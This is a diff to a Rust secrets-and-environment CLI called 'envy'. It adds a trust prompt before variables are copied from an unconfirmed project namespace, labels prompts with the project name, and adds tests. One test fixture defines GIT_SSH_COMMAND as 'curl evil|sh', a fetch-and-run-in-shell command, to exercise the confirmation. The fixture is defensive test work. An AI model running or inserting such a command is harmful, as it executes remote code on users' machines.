@@ -15,7 +15,7 @@ use crate::names::{validate_namespace, validate_var};
 use crate::prompt::{Prompter, plain_label, secret_label, vet_plain};
 use crate::secret::Secret;
 use crate::store::SecretStore;
-use crate::trust::{TrustStore, confirmation_text};
+use crate::trust::{Purpose, TrustStore, confirmation_text_for};
 
 /// Shell text that switches to namespace `ns`. The result contains secrets
 /// by design: the caller may only write it to stdout.
@@ -36,10 +36,7 @@ pub fn activate(ctx: &Ctx, ns: &str, prev: &ActiveState) -> Result<String> {
     let must_record = check_trust(ctx, &file)?;
 
     let key = ctx.cfg.secret_key(ns);
-    let display_ns = match ctx.cfg.identity() {
-        Some(identity) => format!("{ns} (project {identity})"),
-        None => ns.to_string(),
-    };
+    let display_ns = display_ns(ctx.cfg, ns);
     let mut secrets: Vec<(String, Secret)> = Vec::new();
     for (name, value) in file.vars() {
         if value != Value::Secret || ctx.store.get(&key, &name)?.is_some() {
@@ -69,6 +66,15 @@ pub fn activate(ctx: &Ctx, ns: &str, prev: &ActiveState) -> Result<String> {
     render_activate(&file, prev, ctx.store)
 }
 
+/// How prompts name a namespace: with its project at project level, so the
+/// user can tell which Keychain key they are typing into.
+pub(crate) fn display_ns(cfg: &Config, ns: &str) -> String {
+    match cfg.identity() {
+        Some(identity) => format!("{ns} (project {identity})"),
+        None => ns.to_string(),
+    }
+}
+
 /// Asks before a project namespace is used, unless this exact file at this
 /// checkout is already trusted. Returns `Ok(true)` when the user said yes and
 /// the caller must [`record_trust`] once its own writes have succeeded;
@@ -76,6 +82,11 @@ pub fn activate(ctx: &Ctx, ns: &str, prev: &ActiveState) -> Result<String> {
 /// trusted). A no, or no terminal to ask on, is an `Err`. The question names
 /// variables and which secrets are already in the Keychain, never a value.
 pub(crate) fn check_trust(ctx: &Ctx, file: &NamespaceFile) -> Result<bool> {
+    check_trust_for(ctx, file, Purpose::Load)
+}
+
+/// [`check_trust`] with the consent text describing `purpose`.
+pub(crate) fn check_trust_for(ctx: &Ctx, file: &NamespaceFile, purpose: Purpose) -> Result<bool> {
     let Some(root) = ctx.cfg.root() else {
         // The user's own namespace: never asked about.
         return Ok(false);
@@ -98,7 +109,7 @@ pub(crate) fn check_trust(ctx: &Ctx, file: &NamespaceFile) -> Result<bool> {
     if trust.previously_trusted(root, ns)? {
         question.push_str("Note: this namespace file has changed since you last trusted it.\n\n");
     }
-    question.push_str(&confirmation_text(ctx.cfg, file, &in_keychain));
+    question.push_str(&confirmation_text_for(ctx.cfg, file, &in_keychain, purpose));
     let yes = ctx.prompt.confirm(&question).with_context(|| {
         format!(
             "project namespace {ns:?} is not trusted yet and needs a terminal to review it \
@@ -420,17 +431,44 @@ fn restore_files(
 /// Order: validate, check that the namespace can join the group, prompt for
 /// everything, re-check that `ns` still does not exist, then [`apply`]. A
 /// failure at any step leaves nothing behind.
-pub fn create(ctx: &Ctx, ns: &str, like: Option<&NamespaceFile>, link: Option<&str>) -> Result<()> {
+pub fn create(
+    ctx: &Ctx,
+    ns: &str,
+    like: Option<(&Config, &NamespaceFile)>,
+    link: Option<&str>,
+) -> Result<()> {
     validate_namespace(ns)?;
     if let Some(group) = link {
         validate_namespace(group)?;
     }
-    if ctx.cfg.exists(ns)? {
+    let taken = |ctx: &Ctx| {
+        if ctx.cfg.is_project() {
+            ctx.cfg.present(ns)
+        } else {
+            ctx.cfg.exists(ns)
+        }
+    };
+    if taken(ctx)? {
         bail!("namespace {ns:?} already exists");
+    }
+    // Copying is not loading, but it moves a project file's variables into a
+    // namespace that is then trusted (or, at user level, never asked about):
+    // an unconfirmed project source must be confirmed first, against its own
+    // level. The source is not recorded as trusted: the user agreed to a
+    // copy, and it is still confirmed at its first load.
+    if let Some((source_cfg, source)) = like
+        && source_cfg.is_project()
+    {
+        let source_ctx = Ctx {
+            cfg: source_cfg,
+            store: ctx.store,
+            prompt: ctx.prompt,
+        };
+        check_trust_for(&source_ctx, source, Purpose::Copy)?;
     }
     let mut file = NamespaceFile::empty(ns)?;
     let mut like_secrets: Vec<String> = Vec::new();
-    if let Some(source) = like {
+    if let Some((_, source)) = like {
         for (name, value) in source.vars() {
             if value == Value::Secret {
                 like_secrets.push(name.clone());
@@ -446,7 +484,7 @@ pub fn create(ctx: &Ctx, ns: &str, like: Option<&NamespaceFile>, link: Option<&s
     for name in like_secrets {
         let secret = ctx
             .prompt
-            .secret(&secret_label(&name, ns))
+            .secret(&secret_label(&name, &display_ns(ctx.cfg, ns)))
             .with_context(|| format!("no value for secret {name}; nothing was created"))?;
         secrets.push((name, secret));
     }
@@ -456,11 +494,13 @@ pub fn create(ctx: &Ctx, ns: &str, like: Option<&NamespaceFile>, link: Option<&s
     }
     // The prompts can take a while: do not replace a namespace created
     // meanwhile (or write over its Keychain items).
-    if ctx.cfg.exists(ns)? {
+    if taken(ctx)? {
         bail!(
             "namespace {ns:?} was created by something else while envy was prompting; nothing was changed"
         );
     }
+    // `save` writes exactly `file.text()`, so that is what gets recorded.
+    let saved = file.clone();
     apply(
         ctx,
         vec![Change {
@@ -473,7 +513,12 @@ pub fn create(ctx: &Ctx, ns: &str, like: Option<&NamespaceFile>, link: Option<&s
     // The user just wrote this file, so it needs no confirmation later. If
     // recording fails the file already exists; the error is returned and the
     // file is simply confirmed at its first load. A no-op at user level.
-    record_trust(ctx, &ctx.cfg.load(ns)?)
+    record_trust(ctx, &saved).with_context(|| {
+        format!(
+            "namespace {ns:?} was created, but its trust could not be recorded; \
+             it will be confirmed at first load"
+        )
+    })
 }
 
 /// How one variable of `--secret` or `--plain` is set. Never holds a secret
@@ -642,7 +687,7 @@ pub fn remove(ctx: &Ctx, ns: &str) -> Result<()> {
     if ctx.cfg.is_project() {
         let q1 = format!(
             "Delete project namespace {ns:?}? Its file is removed from the working tree \
-             (git status will show it)."
+             (git status may show it)."
         );
         if !ctx.prompt.confirm(&q1)? {
             bail!("cancelled; nothing was changed");
@@ -673,7 +718,13 @@ pub fn remove(ctx: &Ctx, ns: &str) -> Result<()> {
     if delete_items {
         let key = ctx.cfg.secret_key(ns);
         for name in &secrets {
-            ctx.store.delete(&key, name)?;
+            ctx.store.delete(&key, name).with_context(|| {
+                format!(
+                    "cannot delete secret {name} of namespace {ns:?} from the Keychain; the \
+                     namespace file was kept, items before it may already be gone, and running \
+                     the command again finishes the job"
+                )
+            })?;
         }
     }
     ctx.cfg.delete(ns)
@@ -1154,7 +1205,7 @@ mod tests {
             store: &store,
             prompt: &prompt,
         };
-        create(&ctx, "dst", Some(&cfg.load("src").unwrap()), None).unwrap();
+        create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).unwrap();
         assert_eq!(
             read(&dir, "dst"),
             "[vars]\nAWS_REGION = \"eu-west-1\"\nTOKEN = \"@keychain\"\n"
@@ -1176,24 +1227,6 @@ mod tests {
     }
 
     #[test]
-    fn like_unknown_source_errors_and_creates_nothing() {
-        let (dir, cfg) = config_with(&[]);
-        let store = MemoryStore::default();
-        let prompt = ScriptedPrompter::new();
-        let ctx = Ctx {
-            cfg: &cfg,
-            store: &store,
-            prompt: &prompt,
-        };
-        // The caller resolves the source; a missing one never reaches create.
-        let err = cfg.load("nope").unwrap_err().to_string();
-        assert!(err.contains("nope"), "{err}");
-        let _ = ctx;
-        assert!(file_names(&dir).is_empty());
-        assert!(snap(&store).is_empty());
-    }
-
-    #[test]
     fn create_like_self_at_the_same_level_errors_and_creates_nothing() {
         let (dir, cfg) = config_with(&[("w", SOURCE)]);
         let store = MemoryStore::default();
@@ -1204,7 +1237,7 @@ mod tests {
             prompt: &prompt,
         };
         let source = cfg.load("w").unwrap();
-        let err = create(&ctx, "w", Some(&source), None)
+        let err = create(&ctx, "w", Some((&cfg, &source)), None)
             .unwrap_err()
             .to_string();
         assert!(err.contains("already exists"), "{err}");
@@ -1227,7 +1260,7 @@ mod tests {
             store: &store,
             prompt: &prompt,
         };
-        assert!(create(&ctx, "dst", Some(&cfg.load("src").unwrap()), None).is_err());
+        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
         assert_eq!(file_names(&dir), vec!["src.toml"]);
         assert!(snap(&store).is_empty());
     }
@@ -1269,7 +1302,7 @@ mod tests {
             store: &store,
             prompt: &prompt,
         };
-        assert!(create(&ctx, "dst", Some(&cfg.load("src").unwrap()), None).is_err());
+        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
         assert_eq!(file_names(&dir), vec!["src.toml"]);
         assert!(snap(&store.inner).is_empty());
     }
@@ -1287,7 +1320,7 @@ mod tests {
             prompt: &prompt,
         };
         // `exists` is false for a directory, so create proceeds to the save.
-        assert!(create(&ctx, "dst", Some(&cfg.load("src").unwrap()), None).is_err());
+        assert!(create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None).is_err());
         assert!(snap(&store).is_empty());
     }
 
@@ -1405,7 +1438,7 @@ mod tests {
             store: &store,
             prompt: &prompt,
         };
-        let err = create(&ctx, "dst", Some(&cfg.load("src").unwrap()), None)
+        let err = create(&ctx, "dst", Some((&cfg, &cfg.load("src").unwrap())), None)
             .unwrap_err()
             .to_string();
         assert!(err.contains("while envy was prompting"), "{err}");
@@ -2990,6 +3023,7 @@ mod tests {
             "dev",
         )
         .unwrap();
+        assert_eq!(yes.remaining(), 0);
         assert_eq!(
             store.snapshot(),
             vec![
@@ -3630,6 +3664,11 @@ mod tests {
         );
         assert!(store.snapshot().is_empty());
         assert!(trusted(&cfg, ""));
+        // The saved file reloads to exactly the text that was recorded.
+        assert_eq!(
+            cfg.load("dev").unwrap().text(),
+            NamespaceFile::empty("dev").unwrap().text()
+        );
         // Loading it needs no confirmation.
         let quiet = ScriptedPrompter::new();
         activate(
@@ -3674,7 +3713,13 @@ mod tests {
             .unwrap();
         let prompt = ScriptedPrompter::new().with_secret("proj-token");
         let source = user.load("dev").unwrap();
-        create(&ctx_of(&cfg, &store, &prompt), "dev", Some(&source), None).unwrap();
+        create(
+            &ctx_of(&cfg, &store, &prompt),
+            "dev",
+            Some((&user, &source)),
+            None,
+        )
+        .unwrap();
         let text = std::fs::read_to_string(base.path().join(".envy/dev.toml")).unwrap();
         assert_eq!(
             text,
@@ -3693,7 +3738,10 @@ mod tests {
         );
         assert_eq!(
             prompt.asked(),
-            vec![Asked::Secret(secret_label("TOKEN", "dev"))]
+            vec![Asked::Secret(secret_label(
+                "TOKEN",
+                "dev (project acme/api)"
+            ))]
         );
         assert!(trusted(&cfg, &text));
     }
@@ -3820,7 +3868,10 @@ mod tests {
     fn remove_texts_name_secrets_and_mention_sharing() {
         let base = tempfile::tempdir().unwrap();
         let cfg = checkout(base.path(), "a", RM);
-        let store = rm_store();
+        let store = MemoryStore::default();
+        for (n, v) in [("TOKEN", "tok-value-1"), ("API_KEY", "key-value-2")] {
+            store.set(PKEY, n, &Secret::new(v.into())).unwrap();
+        }
         let prompt = ScriptedPrompter::new()
             .with_confirm(true)
             .with_confirm(false);
@@ -3836,9 +3887,259 @@ mod tests {
             "{q2}"
         );
         for q in [q1, q2] {
-            for v in ["\"eu\"", "t'", "\"k\""] {
+            for v in ["\"eu\"", "tok-value-1", "key-value-2"] {
                 assert!(!q.contains(v), "{q}");
             }
         }
+    }
+
+    // ---- fix round 1: copying from an unconfirmed source, errors, labels ----
+
+    const SRC: &str = "[vars]\nGIT_SSH_COMMAND = \"curl evil|sh\"\nTOKEN = \"@keychain\"\n";
+    const COPY_END: &str = "Allow envy to copy these names and plain values into a new namespace";
+
+    fn trusted_ns(cfg: &Config, ns: &str, text: &str) -> bool {
+        crate::trust::TrustStore::new(cfg.user_dir())
+            .is_trusted(cfg.root().unwrap(), ns, text)
+            .unwrap()
+    }
+
+    /// An untrusted project source `dev` in checkout `a`, and a target config.
+    fn copy_setup(user_target: bool) -> (tempfile::TempDir, Config, Config) {
+        let base = tempfile::tempdir().unwrap();
+        let source = checkout(base.path(), "a", SRC);
+        let target = if user_target {
+            Config::new(base.path().join("u"))
+        } else {
+            project_cfg(&base.path().join("b"), "acme/api")
+        };
+        (base, source, target)
+    }
+
+    fn copy_declined_and_accepted(user_target: bool) {
+        let (_base, source, target) = copy_setup(user_target);
+        let src_file = source.load("dev").unwrap();
+        let store = MemoryStore::default();
+        // Declined: nothing asked after the confirmation, nothing written.
+        let no = ScriptedPrompter::new().with_confirm(false).with_secret("x");
+        let err = create(
+            &ctx_of(&target, &store, &no),
+            "new",
+            Some((&source, &src_file)),
+            None,
+        )
+        .unwrap_err();
+        assert!(
+            format!("{err:#}").contains("nothing was changed"),
+            "{err:#}"
+        );
+        assert!(!target.present("new").unwrap());
+        assert!(store.snapshot().is_empty());
+        assert_eq!(no.asked().len(), 1);
+        assert_eq!(no.remaining(), 1);
+        let Asked::Confirm(text) = &no.asked()[0] else {
+            panic!()
+        };
+        assert!(
+            text.contains("GIT_SSH_COMMAND") && text.ends_with(COPY_END),
+            "{text}"
+        );
+        assert!(!trusted_ns(&source, "dev", SRC));
+        if !user_target {
+            assert!(!target.user_dir().join("trust").exists());
+        }
+        // Accepted: created; the source is still not trusted.
+        let yes = ScriptedPrompter::new().with_confirm(true).with_secret("x");
+        create(
+            &ctx_of(&target, &store, &yes),
+            "new",
+            Some((&source, &src_file)),
+            None,
+        )
+        .unwrap();
+        assert!(target.exists("new").unwrap());
+        assert!(!trusted_ns(&source, "dev", SRC));
+        if !user_target {
+            assert!(trusted_ns(
+                &target,
+                "new",
+                &target.load("new").unwrap().text()
+            ));
+        }
+        assert!(matches!(&yes.asked()[0], Asked::Confirm(_)));
+        assert_eq!(yes.asked().len(), 2);
+    }
+
+    #[test]
+    fn copying_an_unconfirmed_project_source_into_a_project_asks_first() {
+        copy_declined_and_accepted(false);
+    }
+
+    #[test]
+    fn copying_an_unconfirmed_project_source_into_user_level_asks_first() {
+        copy_declined_and_accepted(true);
+    }
+
+    #[test]
+    fn copying_a_trusted_project_source_asks_nothing_extra() {
+        let (_base, source, target) = copy_setup(false);
+        let src_file = source.load("dev").unwrap();
+        record_trust(
+            &ctx_of(&source, &MemoryStore::default(), &ScriptedPrompter::new()),
+            &src_file,
+        )
+        .unwrap();
+        let store = MemoryStore::default();
+        let p = ScriptedPrompter::new().with_secret("x");
+        create(
+            &ctx_of(&target, &store, &p),
+            "new",
+            Some((&source, &src_file)),
+            None,
+        )
+        .unwrap();
+        assert_eq!(p.asked().len(), 1);
+        assert!(matches!(&p.asked()[0], Asked::Secret(_)));
+    }
+
+    #[test]
+    fn copying_from_a_user_level_source_asks_no_confirmation() {
+        let (_base, source, target) = copy_setup(false);
+        let user = Config::new(_base.path().join("u"));
+        std::fs::create_dir_all(user.dir()).unwrap();
+        std::fs::write(user.dir().join("dev.toml"), SRC).unwrap();
+        let src_file = user.load("dev").unwrap();
+        let store = MemoryStore::default();
+        let p = ScriptedPrompter::new().with_secret("x");
+        create(
+            &ctx_of(&target, &store, &p),
+            "new",
+            Some((&user, &src_file)),
+            None,
+        )
+        .unwrap();
+        assert!(p.asked().iter().all(|a| matches!(a, Asked::Secret(_))));
+        let _ = source;
+    }
+
+    #[test]
+    fn copying_an_unconfirmed_source_without_a_terminal_fails_and_creates_nothing() {
+        let (_base, source, target) = copy_setup(false);
+        let src_file = source.load("dev").unwrap();
+        let store = MemoryStore::default();
+        let p = ScriptedPrompter::new();
+        assert!(
+            create(
+                &ctx_of(&target, &store, &p),
+                "new",
+                Some((&source, &src_file)),
+                None
+            )
+            .is_err()
+        );
+        assert!(!target.present("new").unwrap());
+        assert!(store.snapshot().is_empty());
+    }
+
+    #[test]
+    fn project_create_labels_name_the_project() {
+        let base = tempfile::tempdir().unwrap();
+        let cfg = project_cfg(base.path(), "acme/api");
+        std::fs::create_dir_all(cfg.dir()).unwrap();
+        std::fs::write(
+            cfg.dir().join("m.toml"),
+            "link = \"aws\"\n[vars]\nX = \"1\"\nS = \"@keychain\"\n",
+        )
+        .unwrap();
+        let store = MemoryStore::default();
+        let p = ScriptedPrompter::new().with_plain("v").with_secret("s");
+        create(&ctx_of(&cfg, &store, &p), "n", None, Some("aws")).unwrap();
+        let label = "n (project acme/api)";
+        let asked = p.asked();
+        assert!(
+            asked.contains(&Asked::Secret(secret_label("S", label))),
+            "{asked:?}"
+        );
+        assert!(
+            asked.iter().any(
+                |a| matches!(a, Asked::Plain { label: l, .. } if *l == plain_label("X", label))
+            ),
+            "{asked:?}"
+        );
+    }
+
+    /// A store whose `delete` fails for one variable name.
+    struct FailingDelete<'a> {
+        inner: &'a MemoryStore,
+        fail_on: &'static str,
+    }
+
+    impl SecretStore for FailingDelete<'_> {
+        fn get(&self, ns: &str, name: &str) -> Result<Option<Secret>> {
+            self.inner.get(ns, name)
+        }
+        fn set(&self, ns: &str, name: &str, value: &Secret) -> Result<()> {
+            self.inner.set(ns, name, value)
+        }
+        fn delete(&self, ns: &str, name: &str) -> Result<()> {
+            if name == self.fail_on {
+                bail!("simulated Keychain failure");
+            }
+            self.inner.delete(ns, name)
+        }
+    }
+
+    #[test]
+    fn remove_project_store_failure_keeps_the_file_and_can_be_rerun() {
+        let base = tempfile::tempdir().unwrap();
+        let cfg = checkout(base.path(), "a", RM);
+        let inner = rm_store();
+        let failing = FailingDelete {
+            inner: &inner,
+            fail_on: "API_KEY",
+        };
+        let p = ScriptedPrompter::new()
+            .with_confirm(true)
+            .with_confirm(true);
+        let ctx = Ctx {
+            cfg: &cfg,
+            store: &failing,
+            prompt: &p,
+        };
+        let err = format!("{:#}", remove(&ctx, "dev").unwrap_err());
+        assert!(
+            err.contains("API_KEY") && err.contains("kept") && err.contains("again"),
+            "{err}"
+        );
+        assert!(cfg.exists("dev").unwrap());
+        let p2 = ScriptedPrompter::new()
+            .with_confirm(true)
+            .with_confirm(true);
+        remove(&ctx_of(&cfg, &inner, &p2), "dev").unwrap();
+        assert!(!cfg.exists("dev").unwrap());
+        assert_eq!(
+            inner.snapshot(),
+            vec![
+                entry("dev", "TOKEN", "u"),
+                entry("project/other/repo/dev", "TOKEN", "o"),
+            ]
+        );
+    }
+
+    #[test]
+    fn remove_project_with_only_some_secrets_in_the_keychain() {
+        let base = tempfile::tempdir().unwrap();
+        let cfg = checkout(base.path(), "a", RM);
+        let store = MemoryStore::default();
+        store
+            .set(PKEY, "API_KEY", &Secret::new("k".into()))
+            .unwrap();
+        store.set("dev", "TOKEN", &Secret::new("u".into())).unwrap();
+        let p = ScriptedPrompter::new()
+            .with_confirm(true)
+            .with_confirm(true);
+        remove(&ctx_of(&cfg, &store, &p), "dev").unwrap();
+        assert!(!cfg.exists("dev").unwrap());
+        assert_eq!(store.snapshot(), vec![entry("dev", "TOKEN", "u")]);
     }
 }
